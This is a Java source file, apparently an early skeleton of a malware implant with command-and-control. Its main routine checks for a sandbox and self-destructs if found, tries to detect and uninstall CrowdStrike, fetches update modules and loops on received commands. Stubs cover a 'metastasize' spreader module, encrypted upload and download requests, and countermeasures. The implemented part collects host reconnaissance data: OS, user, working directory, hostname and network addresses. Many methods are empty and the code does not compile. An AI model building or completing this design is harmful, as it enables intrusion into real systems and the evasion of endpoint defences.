import java.io.BufferedReader;
import java.io.FileReader;
import java.io.StringWriter;
import java.lang.reflect.Array;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.Arrays;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.*;
import javax.xml.transform.stream.StreamResult;
import java.net.UnknownHostException;

import javax.crypto.SecretKey;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.swing.text.html.HTMLEditorKit.Parser;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;

class nConfig
{
    public int locTcpPort = 49602;
    public String encKey = "";
    public int metastasize = 0;
    public String uri = "";
    public int stutterMin = 10;
    public int stutterMax = 50;
}

public class nCore
{
    public static void Main(String[] args)
    {
        
        //convert to thread once main loop has been tested

        //check if the program can reach out and if it's in a sandbox
        if (!keepalive() || countermeasures.chkSandbox())
        {
            countermeasures.spoliate();
        }

        //check if crowdstrike is installed and attempt uninstall if it is
        if (countermeasures.getCStrike())
        {
            countermeasures.counterStrike();
        }

        modLib.getUpdate();

        //execute initial 
        //start loop
        react("metadata");
    }

    public static boolean keepalive()
    {

    }

    public static void react(String methodName)
    {
        //exec method, uses threader, loops to keepalive
        // 1. recv cmd
        // 2. modsearch
        // 3. thread mod if extant
        // 4. attempt to pull if not
    }

    public static void threader()
    {

    }

    //need class getter

    class modLib
    {
        public static void getUpdate()
        {

        }

        public class autoLib
        {
            private static Document metastasize()
            {
                // spreader governor module, searches the autolib inner class cancer for any modules other than itself and runs them
            }

            class cancer
            {
                //currently empty, populated when modules updated
            }
        }

        private class genLib
        {
            private Document metadata() throws SocketException, UnknownHostException, ParserConfigurationException
            {
                Hashtable<String,String> metadata = new Hashtable<>();
                utilitarian nUtil = new utilitarian();

                metadata.put("arch",System.getProperty("os.arch"));
                metadata.put("os",System.getProperty("os.name"));
                metadata.put("version",System.getProperty("os.version"));
                metadata.put("user",System.getProperty("user.name"));
                metadata.put("cwd",System.getProperty("user.dir"));
                metadata.put("jre",System.getProperty("java.runtime.version"));
                metadata.put("interfaces",nUtil.getAddress().toString());
                metadata.put("hostname",nUtil.getHostname());

                return nUtil.outputToXmlDoc("metadata",metadata);
            }

            
        }

        private class nixLib
        {
            //currently empty, populated when modules updated
        }

        private class winLib
        {
            //currently empty, populated when modules updated
        }


    } 

    private class utilitarian
    {

        private Method getMethodByName(String methodName)
        {
            
        }

        private Class getClassByName(String className)
        {

        }

        private String xmlDocToString(Document xmlDoc) throws TransformerException
        {
            TransformerFactory tFacInst = TransformerFactory.newInstance();
            Transformer tFac = tFacInst.newTransformer();
            StringWriter stWrite = new StringWriter();
            tFac.transform(new DOMSource(xmlDoc), new StreamResult(stWrite));
            return stWrite.toString();
        }

        private Document outputToXmlDoc(String rootName, Hashtable<String,String> output) throws ParserConfigurationException
        {
            DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
            DocumentBuilder constructor = manufactorum.newDocumentBuilder();

            Document doc = constructor.newDocument();

            Element root = doc.createElement(rootName);
            doc.appendChild(root);
        
            Enumeration<String> k = output.keys();

            while (k.hasMoreElements())
            {
                String key = k.nextElement();
                Element kElement = doc.createElement("data");
                kElement.setAttribute(
                    key.toString(),
                    output.get(key.toString())
                );
                root.appendChild(kElement);
            }

            return doc;
        }

        private String getHostname() throws UnknownHostException {
            String deviceName = new String();
                try {
                    InetAddress ipAddress = InetAddress.getLocalHost();
                    deviceName = ipAddress.getHostName();
                } catch (Exception e) {
                    String envVar = new String();
                    try {
                        if (System.getProperty("os.name").contains("Win")) {
                            deviceName = System.getenv("COMPUTERNAME");
                        } else {
                            StringBuilder fileString = new StringBuilder();
                            BufferedReader fileReader = new BufferedReader(new FileReader("/proc/sys/kernel/hostname"));
                            String nextLine = fileReader.readLine();
                            while (nextLine != null) {
                                fileString.append(nextLine);
                                nextLine = fileReader.readLine();
                            }
                            deviceName = fileString.toString();
                        }
                    } catch (Exception f) {
                        deviceName = "na";
                    }
                }
                return deviceName;
        }
        
        private Hashtable getAddress() throws SocketException {
            Hashtable interfaceMap = new Hashtable();
            Enumeration interfaces = NetworkInterface.getNetworkInterfaces();
            while(interfaces.hasMoreElements()) {
                ArrayList<String> addressList = new ArrayList<String>();
                NetworkInterface interfaceObject = (NetworkInterface) interfaces.nextElement();
                Enumeration addresses = interfaceObject.getInetAddresses();
                while(addresses.hasMoreElements()) {
                    InetAddress addressObject = (InetAddress) addresses.nextElement();
                    addressList.add(addressObject.getHostAddress());
                }
                interfaceMap.put(interfaceObject.getName(),addressList.toString());
            }
            return interfaceMap;
        }
    }

    private class network
    {
        private byte[] request()
        {

        }

        private Hashtable kaReq(String data)
        {
            //returns formatted data for a keepalive request

        }

        private Hashtable upReq(String data)
        {
            //returns formatted data for an upload request
        }

        private Hashtable dnReq(String data)
        {
            //returns formatted data for a download request
        }

        private Hashtable auReq(String Data)
        {

        }

        
    }

    private class security
    {
        private static byte[] encrypt()
        {

        }

        private static byte[] decrypt()
        {

        }

        private static SecretKey init() throws Exception
        {
    
        }
    
        private byte[] doWork(byte[] plaintext, byte[] nonce, int mode) throws Exception
        {

        }
    }

    private class countermeasures
    {
        private static boolean chkSandbox()
        {

        }

        private static void spoliate()
        {

        }

        private static void counterStrike()
        {

        }

        private static boolean getCStrike()
        {

        }
    }
}
